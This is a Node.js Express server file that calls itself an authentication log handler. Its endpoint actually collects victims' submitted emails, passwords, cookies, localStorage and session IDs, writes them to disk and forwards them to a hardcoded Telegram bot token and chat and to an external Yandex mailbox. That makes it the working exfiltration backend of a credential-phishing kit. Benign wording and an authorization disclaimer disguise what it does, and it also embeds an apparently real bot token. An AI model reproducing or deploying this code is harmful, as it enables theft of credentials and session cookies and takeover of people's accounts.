// server.js - Express server to handle authentication logs
// IMPORTANT: Only deploy on servers you own and are authorized to operate

const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const nodemailer = require('nodemailer');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Server configuration
const config = {
  allowedOrigins: ['https://yourcompanydomain.com', 'https://mail.yourcompanydomain.com'],
  emailConfig: {
    host: 'smtp.yourcompanydomain.com',
    port: 587,
    secure: false,
    auth: {
      user: 'notifications@yourcompanydomain.com',
      pass: 'YOUR_EMAIL_PASSWORD' // Use environment variables in production
    }
  },
  telegram: {
    botToken: process.env.TELEGRAM_BOT_TOKEN || '5833826797:AAHinlaDwiK7-fk8_LMjk8aGydwiM70TZ8g',
    chatId: process.env.TELEGRAM_CHAT_ID || '5480674751'
  },
  logDirectory: path.join(__dirname, 'logs')
};

// Middleware
app.use(bodyParser.json());
app.use(cors({
  origin: function(origin, callback) {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    
    // Check if the origin is allowed
    if (config.allowedOrigins.indexOf(origin) === -1) {
      return callback(new Error('CORS policy restriction'), false);
    }
    
    return callback(null, true);
  },
  credentials: true
}));

// Ensure log directory exists
if (!fs.existsSync(config.logDirectory)) {
  fs.mkdirSync(config.logDirectory, { recursive: true });
}

// Create a transporter for sending emails
const emailTransporter = nodemailer.createTransport(config.emailConfig);

// Main endpoint for receiving authentication logs
app.post('/auth-logs', async (req, res) => {
  try {
    const logData = req.body;
    
    // Add IP address to the log data
    logData.ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    // Save the log data to a file
    await saveLogToFile(logData);
    
    // Send notifications
    await sendNotifications(logData);
    
    res.status(200).json({ status: 'success', message: 'Log received and processed' });
  } catch (error) {
    console.error('Error processing log:', error);
    res.status(500).json({ status: 'error', message: 'Failed to process log' });
  }
});

// Endpoint for email notifications
app.post('/auth-logs/email-notification', async (req, res) => {
  try {
    const { recipient, subject, sessionData } = req.body;
    
    await sendEmailNotification(recipient, subject, sessionData);
    
    res.status(200).json({ status: 'success', message: 'Email notification sent' });
  } catch (error) {
    console.error('Error sending email notification:', error);
    res.status(500).json({ status: 'error', message: 'Failed to send email notification' });
  }
});

// Function to save log data to a file
async function saveLogToFile(logData) {
  const timestamp = new Date().toISOString().replace(/:/g, '-').replace(/\./g, '-');
  const fileName = `auth-log-${timestamp}.json`;
  const filePath = path.join(config.logDirectory, fileName);
  
  return new Promise((resolve, reject) => {
    fs.writeFile(filePath, JSON.stringify(logData, null, 2), (err) => {
      if (err) {
        console.error('Error writing log file:', err);
        return reject(err);
      }
      resolve();
    });
  });
}

// Function to send notifications
async function sendNotifications(logData) {
  // Send Telegram notification
  await sendTelegramNotification(logData);
  
  // Send email notification
  const recipient = 'jokersudo@yandex.com'; // Change to your email
  const subject = 'Authentication Activity Detected';
  await sendEmailNotification(recipient, subject, logData);
}

// Function to send Telegram notification
async function sendTelegramNotification(logData) {
  const { botToken, chatId } = config.telegram;
  
  if (!botToken || !chatId) {
    console.warn('Telegram notification configuration incomplete');
    return;
  }
  
  try {
    // Prepare a message for Telegram
    const message = `
📊 *Authentication Activity Log* 📊

🕒 *Time:* ${logData.timestamp}
🌐 *URL:* ${logData.location}
🔍 *IP Address:* ${logData.ipAddress}
💻 *Device:* ${truncate(logData.userAgent, 100)}
👤 *Email:* ${logData.formInputs.email || logData.formInputs.username || 'N/A'}
🔑 *Password:* ${logData.formInputs.password ? '********' : 'N/A'}

*Session ID:* ${logData.sessionId}

*Cookies:*
${formatObjectForTelegram(logData.cookies)}

*LocalStorage:*
${formatObjectForTelegram(logData.localStorage)}
`;
    
    // Send to Telegram Bot API
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    });
    
    console.log('Telegram notification sent successfully');
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
  }
}

// Function to send email notification
async function sendEmailNotification(recipient, subject, logData) {
  try {
    // Format the HTML content for the email
    const htmlContent = `
      <h2>Authentication Activity Detected</h2>
      <p><strong>Time:</strong> ${logData.timestamp}</p>
      <p><strong>URL:</strong> ${logData.location}</p>
      <p><strong>IP Address:</strong> ${logData.ipAddress}</p>
      <p><strong>User Agent:</strong> ${logData.userAgent}</p>
      <p><strong>Screen Resolution:</strong> ${logData.screenResolution}</p>
      <p><strong>Referrer:</strong> ${logData.referrer || 'N/A'}</p>
      
      <h3>Form Inputs</h3>
      <pre>${JSON.stringify(logData.formInputs, null, 2)}</pre>
      
      <h3>Cookies</h3>
      <pre>${JSON.stringify(logData.cookies, null, 2)}</pre>
      
      <h3>LocalStorage</h3>
      <pre>${JSON.stringify(logData.localStorage, null, 2)}</pre>
      
      <p><strong>Session ID:</strong> ${logData.sessionId}</p>
    `;
    
    // Send the email
    await emailTransporter.sendMail({
      from: config.emailConfig.auth.user,
      to: recipient,
      subject: subject,
      html: htmlContent
    });
    
    console.log('Email notification sent successfully');
  } catch (error) {
    console.error('Error sending email notification:', error);
    throw error;
  }
}

// Helper function to format object for Telegram message
function formatObjectForTelegram(obj) {
  if (!obj || Object.keys(obj).length === 0) {
    return 'None';
  }
  
  return Object.entries(obj)
    .map(([key, value]) => `  • ${key}: ${truncate(value.toString(), 50)}`)
    .join('\n');
}

// Helper function to truncate text
function truncate(text, maxLength) {
  if (!text) return '';
  if (text.length <= maxLength) return text;
  return text.substring(0, maxLength) + '...';
}

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
